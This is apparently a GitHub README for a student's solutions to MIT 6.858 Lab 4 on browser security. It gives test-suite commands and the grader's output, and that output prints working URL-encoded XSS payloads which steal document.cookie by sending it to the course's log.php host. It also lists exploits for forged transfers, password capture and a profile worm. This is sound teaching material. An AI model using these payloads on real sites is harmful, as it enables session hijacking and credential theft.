# Lab 4: Browser Security

This is the fourth lab from the MIT 6.858 Computer Security Systems class which is available for free on [MIT OpenCourseWare](https://ocw.mit.edu/courses/6-858-computer-systems-security-fall-2014/). I followed this online course independently and completed the labs on my own VM.

[Lab 4 Instructions](https://css.csail.mit.edu/6.858/2020/labs/lab4.html) 

My solutions to the exercises in this lab can be found in the files prefixed with `answer-`.

Use the following commands to run the test suite:

```xslt
$ git clone https://github.com/NolanJMcCafferty/MIT-6.858-Computer-Systems-Security
$ cd MIT-6.858-Computer-Systems-Security
$ git checkout lab4
$ make check
```

Test Results: 
 
(output lines with `[ ???? ]` indicate that the result must be checked manually by the course grader)
(all automatic tests passed, except for the challenge which has not been attempted yet)

```$xslt
student@6858-v20:~/lab$ make check
./check-lab4.sh
Generating reference images...
Registering as grader, graderpassword
Registering as attacker, attackerpassword
Registering as grader1, password1
Registering as grader2, password2
Registering as grader3, password3
[ INFO ]: Testing exploit for Exercise 1...
Registering as grader, graderpassword
Registering as attacker, attackerpassword
Expecting cookie: grader#de739a1d44fc8201c14f9f3229bace36
[ PASS ]: alert contains: grader#de739a1d44fc8201c14f9f3229bace36
[ INFO ]: Testing exploit for Exercise 2...
Registering as grader, graderpassword
Registering as attacker, attackerpassword
[ ???? ]: Check log (https://css.csail.mit.edu/6.858/2020/labs/log.php), expecting string 'grader#c0ffeaaa70862090f99838ceffe2e360'
[ INFO ]: Testing exploit for Exercise 3...
Found URL: http://localhost:8080/zoobar/index.cgi/users?user=%22%20onfocus=%22alert(document.cookie)%22%20autofocus=%22&random=3
Registering as grader, graderpassword
Registering as attacker, attackerpassword
Expecting cookie: grader#f5969e7fd71707ef9897ffc641784343
[ PASS ]: alert contains: grader#f5969e7fd71707ef9897ffc641784343
[ INFO ]: Testing exploit for Exercise 4...
Found URL: http://localhost:8080/zoobar/index.cgi/users?user=%22%20onfocus=%22var%20img%20%3D%20new%20Image()%3Bimg.src%3D%27https%3A%2F%2Fcss.csail.mit.edu%2F6.858%2F2020%2Flabs%2Flog.php%3F%27%20%2B%20%27id%3Drollhens%27%20%2B%20%27%26payload%3D%27%20%2B%20encodeURIComponent(document.cookie)%20%2B%20%27%26random%3D%27%20%2B%20Math.random()%3Bimg.click()%3B%22%20autofocus=%22&random=3
Registering as grader, graderpassword
Registering as attacker, attackerpassword
[ ???? ]: Check log (https://css.csail.mit.edu/6.858/2020/labs/log.php), expecting string 'grader#829233c4afa7d768304e730ff063e617'
[ INFO ]: Testing exploit for Exercise 5...
Found URL: http://localhost:8080/zoobar/index.cgi/users?user=%22%20onfocus%3D%22var%20img%20%3D%20new%20Image()%3Bimg.src%3D%27https%3A%2F%2Fcss.csail.mit.edu%2F6.858%2F2020%2Flabs%2Flog.php%3F%27%20%2B%20%27id%3Drollhens%27%20%2B%20%27%26payload%3D%27%20%2B%20encodeURIComponent(document.cookie)%20%2B%20%27%26random%3D%27%20%2B%20Math.random()%3Bimg.click()%3Bwindow.onload%20%3D%20function()%20%7Bdocument.getElementsByClassName(%27warning%27)%5B0%5D.style.display%20%3D%20%27none%27%3B%7D%22%20autofocus%3D%22
Registering as grader, graderpassword
Registering as attacker, attackerpassword
[ ???? ]: Check log (https://css.csail.mit.edu/6.858/2020/labs/log.php), expecting string 'grader#ebc7d34b317cdba01fb81aaa3325b148'
[ PASS ]: ./lab4-tests/answer-5.png matched reference image (557200 non-background pixels)
[ INFO ]: Testing exploit for Exercise 6...
Registering as grader, graderpassword
Registering as attacker, attackerpassword
[ PASS ]: grader zoobar count
[ PASS ]: attacker zoobar count
[ INFO ]: Testing exploit for Exercise 7...
Registering as grader, graderpassword
Registering as attacker, attackerpassword
[ PASS ]: grader zoobar count
[ PASS ]: attacker zoobar count
[ INFO ]: Testing exploit for Exercise 8...
Registering as grader, graderpassword
Registering as attacker, attackerpassword
Loading attacker page. If you get a timeout here you're not redirecting to http://css.csail.mit.edu/6.858/2020/.
[ PASS ]: visited final page
[ PASS ]: grader zoobar count
[ PASS ]: attacker zoobar count
[ INFO ]: Testing exploit for Exercise 9...
Registering as grader, DQPUFYCYWLHZ
Registering as attacker, attackerpassword
Entering grader/DQPUFYCYWLHZ into form.
[ PASS ]: User logged in
[ INFO ]: Testing exploit for Exercise 10...
Registering as grader, GQQOKFEVTMFQ
Registering as attacker, attackerpassword
Entering grader/GQQOKFEVTMFQ into form.
[ PASS ]: alert contains user password: GQQOKFEVTMFQ
[ PASS ]: User logged in
[ INFO ]: Testing exploit for Exercise 11...
Registering as grader, CBNLDGIRGSAB
Registering as attacker, attackerpassword
Entering grader/CBNLDGIRGSAB into form.
[ ???? ]: Check log (https://css.csail.mit.edu/6.858/2020/labs/log.php), expecting string 'grader/CBNLDGIRGSAB'
[ INFO ]: Testing exploit for Exercise 12...
Registering as grader, VOJPCJHOSAZC
Registering as attacker, attackerpassword
Entering grader/VOJPCJHOSAZC into form.
[ ???? ]: Check log (https://css.csail.mit.edu/6.858/2020/labs/log.php), expecting string 'grader/VOJPCJHOSAZC'
[ PASS ]: User logged in
[ INFO ]: Testing exploit for Exercise 13...
Registering as grader, ANCSKWXYRYUA
Registering as attacker, attackerpassword
Loading attacker page, logged in. If you get a timeout here, you're not redirecting to http://css.csail.mit.edu/6.858/2020/.
[ PASS ]: visited final page
[ PASS ]: grader zoobar count
[ PASS ]: attacker zoobar count
Loading attacker page, logged out
[ PASS ]: ./lab4-tests/answer-13.png matched reference image (550456 non-background pixels)
Entering grader/ANCSKWXYRYUA into form.
[ ???? ]: Check log (https://css.csail.mit.edu/6.858/2020/labs/log.php), expecting string 'ANCSKWXYRYUA'
[ PASS ]: User logged in
[ INFO ]: Testing exploit for Challenge...
[ FAIL ]: No answer-chal.html
[ INFO ]: Testing exploit for Exercise 14...
Registering as attacker, attackerpassword
Installing attacker profile
Registering as grader1, password1
Viewing attacker profile
[ PASS ]: ./lab4-tests/answer-14_0.png matched reference image (557320 non-background pixels)
[ PASS ]: grader1 zoobars
[ PASS ]: attacker zoobars
Registering as grader2, password2
Viewing grader1 profile
[ PASS ]: ./lab4-tests/answer-14_1.png matched reference image (557352 non-background pixels)
[ PASS ]: grader2 zoobars
[ PASS ]: attacker zoobars
Registering as grader3, password3
Viewing grader2 profile
[ PASS ]: ./lab4-tests/answer-14_2.png matched reference image (557348 non-background pixels)
[ PASS ]: grader3 zoobars
[ PASS ]: attacker zoobars
```
